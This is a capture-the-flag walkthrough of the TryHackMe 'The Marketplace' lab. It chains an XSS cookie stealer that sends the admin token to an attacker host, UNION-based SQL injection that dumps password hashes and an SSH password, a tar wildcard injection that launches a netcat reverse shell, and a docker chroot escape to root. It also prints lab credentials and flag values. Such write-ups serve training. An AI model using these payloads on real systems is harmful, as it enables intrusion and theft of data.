# The Marketplace

Can you take over The Marketplace's infrastructure?

The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.

Can you take advantage of this and will you be able to gain root access on his server?

# What is flag 1?

*Hint: If you think a listing is breaking the rules, you can report it!*

## Services

An initial Nmap scan reveals that SSH is running on the host on port 22, as well as 2 web services, on port 80 and 32768:

~~~
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web application

After playing a bit with the web application, there are several things we can do:

* sign up (`/signup`)
* sign in (`/login`)
* view listings (`/`)
* view the details a a specific listing (`/item/1`)
* create a new listing (`/new`)
* view messages (`/messages`)
* contact the listing author (`/contact/michael`)
* report a listing to admins (`/report/1`)

There is also a `robots.txt` file that reveals an `/admin` location, but we are not granted access. Running gobuster won't reveal more resources.

Interestingly, reporting a listing will generate a first message (the acknowledgment), and then a second message, to simulate an admin action:

![report.png](files/report.png)

## Token cookie

Intercepting the requests in BurpSuite will reveal a `token` cookie:

~~~
GET /report/1 HTTP/1.1
Host: 10.10.4.48
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.4.48/item/1
Connection: close
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoidGVzdCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjIxNzQ5ODU4fQ.fVUaxWnNiR2427T4FHTeu4ByeBh1pMN5H6nk7onseUY
Upgrade-Insecure-Requests: 1
If-None-Match: W/"314-3YWax+bH+BT3tKkMDiGm21ureFQ"
Cache-Control: max-age=0
~~~

Using https://jwt.io/, we can decode the token cookie:

~~~
Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload:
{
  "userId": 4,
  "username": "test",
  "admin": false,
  "iat": 1621749858
}
~~~

I tried to forge a fake admin token, but it failed to grant me access to the admin interface.

## XSS vulnerability

The listing creation form is vulnerable to XSS:

![xss.png](files/xss.png)

![xss2.png](files/xss2.png)

## Stealing the admin cookie

We can take advantage of the XSS vulnerability to create a new listing, and report the listing to the admins. Once an admin will review our listing (we have seen previously that there is kind of a cron job that simulates this action), we will be able to steal his session using `grabber.php`.

Create a new listing and post the following content:

~~~
<script>document.location='http://10.8.50.72:8000/grabber.php?c='+document.cookie</script>
~~~

Now, create [grabber.php](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss) as follows:

```php
$ cat > grabber.php << EOF
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
EOF
```

Then run a listener (`nc -nlvp 8000`) and report the listing you've created to the admin (e.g. `http://10.10.4.48/report/3`).

In your listener, you should have a stolen copy of the admin's cookie:

~~~
┌──(kali㉿kali)-[/data/The_Marketplace/files]
└─$ nc -nlvp 8000
listening on [any] 8000 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.4.48] 36374
GET /grabber.php?c=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjE2NzQ1NjN9.SZDjFMO2_KIMpIoLWuD5Zt3fKggTM8AoTS7plL32uig HTTP/1.1
Host: 10.8.50.72:8000
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://localhost:3000/item/5
Accept-Encoding: gzip, deflate
Accept-Language: en-US
~~~

Now, browse the `/admin` location, intercept the request in Burp Suite and replace the token with the one from the admin:

~~~
GET /admin HTTP/1.1
Host: 10.10.4.48
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjE2NzQ1NjN9.SZDjFMO2_KIMpIoLWuD5Zt3fKggTM8AoTS7plL32uig
Upgrade-Insecure-Requests: 1
~~~

We are now connected as admin:

![admin_token.png](files/admin_token.png)

Flag: `THM{c37a63895910e478f28669b048c348d5}`

# What is flag 2? (User.txt)

## SQLi vulnerability

Analyzing the user listing, we notice that all links have the following form: http://10.10.4.48/admin?user=1

Replacing the numerical ID with a quote sign will trigger the following error:

~~~
Error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the
manual that corresponds to your MySQL server version for the right syntax to
use near ''' at line 1
~~~ 

## Exploit the SQL injection

I failed to use sqlmap, as it failed with a 403 error code each time. Let's try the manual way:

### Database and tables

**Database identification:**

~~~
$ curl -s --cookie "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjE2NzQ1NjN9.SZDjFMO2_KIMpIoLWuD5Zt3fKggTM8AoTS7plL32uig" \
http://10.10.4.48/admin?user=`urlencode "0 UNION SELECT 1,database(),3,4"` | tail

      <h1 style="text-align: center">User 1</h1>
      <div>
          User marketplace <br />
          ID: 1 <br />
          Is administrator: true <br />
       <button onclick="this.disabled = true">Delete user</button>
      </div>
  </body>
</html>
~~~

Database: `marketplace`

**Tables identification**

~~~
$ curl -s --cookie "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjE2NzQ1NjN9.SZDjFMO2_KIMpIoLWuD5Zt3fKggTM8AoTS7plL32uig" \
http://10.10.4.48/admin?user=`urlencode "0 UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema='marketplace'"` | tail 

      <h1 style="text-align: center">User 1</h1>
      <div>
          User items,messages,users <br />
          ID: 1 <br />
          Is administrator: true <br />
       <button onclick="this.disabled = true">Delete user</button>
      </div>
  </body>
</html>
~~~

Tables: `items`, `messages`, `users`

### Users table

**Users table columns**

~~~
$ curl -s --cookie "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjE2NzQ1NjN9.SZDjFMO2_KIMpIoLWuD5Zt3fKggTM8AoTS7plL32uig" \
http://10.10.4.48/admin?user=`urlencode "0 UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_schema='marketplace' AND table_name='users'"` | tail

      <h1 style="text-align: center">User 1</h1>
      <div>
          User id,isAdministrator,password,username <br />
          ID: 1 <br />
          Is administrator: true <br />
       <button onclick="this.disabled = true">Delete user</button>
      </div>
  </body>
</html>
~~~

Users table columns:

* id
* isAdministrator
* password
* username

**Dump users table**

Usernames:

~~~
└─$ curl -s --cookie "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjE2NzQ1NjN9.SZDjFMO2_KIMpIoLWuD5Zt3fKggTM8AoTS7plL32uig" \
http://10.10.4.48/admin?user=`urlencode "0 UNION SELECT 1,GROUP_CONCAT(username),3,4 FROM marketplace.users"` | tail

      <h1 style="text-align: center">User 1</h1>
      <div>
          User jake,michael,system,test <br />
          ID: 1 <br />
          Is administrator: true <br />
       <button onclick="this.disabled = true">Delete user</button>
      </div>
  </body>
</html>
~~~

Passwords:

~~~
$ curl -s --cookie "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjE2NzQ1NjN9.SZDjFMO2_KIMpIoLWuD5Zt3fKggTM8AoTS7plL32uig" \
http://10.10.4.48/admin?user=`urlencode "0 UNION SELECT 1,GROUP_CONCAT(password),3,4 FROM marketplace.users"` | tail

      <h1 style="text-align: center">User 1</h1>
      <div>
          User $2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW,$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q,$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG,$2b$10$oX4eZCpFWnJV0Xj.OemYqOy4RAepVk.Tu56TvYqB/FpPEOKf00tOC <br />
          ID: 1 <br />
          Is administrator: true <br />
       <button onclick="this.disabled = true">Delete user</button>
      </div>
  </body>
</html>
~~~

I tried to brute force the following hashes, but it failed:

~~~
jake:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW
michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q
system:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG
test:$2b$10$oX4eZCpFWnJV0Xj.OemYqOy4RAepVk.Tu56TvYqB/FpPEOKf00tOC
~~~

### Messages table

**Messages table columns**

~~~
$ curl -s --cookie "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjE2NzQ1NjN9.SZDjFMO2_KIMpIoLWuD5Zt3fKggTM8AoTS7plL32uig" \
http://10.10.4.48/admin?user=`urlencode "0 UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_schema='marketplace' AND table_name='messages'"` | tail

      <h1 style="text-align: center">User 1</h1>
      <div>
          User id,is_read,message_content,user_from,user_to <br />
          ID: 1 <br />
          Is administrator: true <br />
       <button onclick="this.disabled = true">Delete user</button>
      </div>
  </body>
</html>
~~~

**Dump the messages**

~~~
$ curl -s --cookie "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjE2NzQ1NjN9.SZDjFMO2_KIMpIoLWuD5Zt3fKggTM8AoTS7plL32uig" \
http://10.10.4.48/admin?user=`urlencode "0 UNION SELECT 1,GROUP_CONCAT(message_content),3,4 FROM marketplace.messages"` | tail
      <div>
          User Hello!
An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password.
Your new password is: @b_ENXkGYUCAv3zJ,Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,Thank you for your report. We have reviewed the listing and found nothing that violates our rules.,Thank you for your report. We have been unable to review the listing at this time. Something may be blocking our ability to view it, such as alert boxes, which are blocked in our employee&#39;s browsers. <br />
          ID: 1 <br />
          Is administrator: true <br />
       <button onclick="this.disabled = true">Delete user</button>
      </div>
  </body>
</html>
~~~

We have a password: `@b_ENXkGYUCAv3zJ`

## Connect as jake

We can now connect as `jake` with the password found just above against the SSH service.

~~~
jake@the-marketplace:~$ cat user.txt 
THM{c3648ee7af1369676e3e4b15da6dc0b4}
~~~

# What is flag 3? (Root.txt)

## Lateral move (jake -> michael)

Checking the other users reveals that it may be interesting to move to `michael`, as he his in a `docker` group:

~~~
jake@the-marketplace:~/tmp$ id michael
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
~~~

Searching for files owned by `michael` will reveal an interesting `backup.sh` script:

~~~
jake@the-marketplace:/home/marketplace$ find / -type f -user michael -exec ls -l {} + 2>/dev/null
-rw-r--r-- 1 michael michael  220 Aug 23  2020 /home/michael/.bash_logout
-rw-r--r-- 1 michael michael 3771 Aug 23  2020 /home/michael/.bashrc
-rw-r--r-- 1 michael michael  807 Aug 23  2020 /home/michael/.profile
-rwxr-xr-x 1 michael michael   73 Aug 23  2020 /opt/backups/backup.sh
~~~

This script compresses files using `tar` and a wildcard. Checking on GTFOBins, we know we can exploit this.

~~~
jake@the-marketplace:/home/marketplace$ cat /opt/backups/backup.sh 
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
~~~

Checking our privileges will reveal that we can run this backup script as `michael` without password:

~~~
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
~~~

Start a listener (`nc -nlvp 4444`) and run the following commands on the target:

~~~
jake@the-marketplace:~$ cat > /opt/backups/shell.sh << EOF
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.50.72 4444 >/tmp/f
EOF
jake@the-marketplace:~$ chmod +x /opt/backups/shell.sh
jake@the-marketplace:~$ touch "/opt/backups/--checkpoint=1"
jake@the-marketplace:~$ touch "/opt/backups/--checkpoint-action=exec=sh shell.sh"
jake@the-marketplace:~$ cd /opt/backups/
jake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh
~~~

On the listener, a shell is now spawned, and we are now connected as `michael`:

~~~
┌──(kali㉿kali)-[/data/The_Marketplace/files]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.4.48] 46366
michael@the-marketplace:/opt/backups$ id
id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
~~~

## docker

Listing the images, we see that alpine is available:

~~~
michael@the-marketplace:/opt/backups$ docker image ls
docker image ls
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
themarketplace_marketplace   latest              6e3d8ac63c27        8 months ago        2.16GB
nginx                        latest              4bb46517cac3        9 months ago        133MB
node                         lts-buster          9c4cc2688584        9 months ago        886MB
mysql                        latest              0d64f46acfd1        9 months ago        544MB
alpine                       latest              a24bb4013296        11 months ago       5.57MB
~~~

Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/docker/), we see that we can exploit it to gain a root shell:

~~~
michael@the-marketplace:/opt/backups$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
michael@the-marketplace:/opt/backups$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
t /mnt shn -v /:/mnt --rm -it alpine chroot
# id
id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
~~~

## Root flag

~~~
# cat /root/root.txt 
cat /root/root.txt
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
~~~
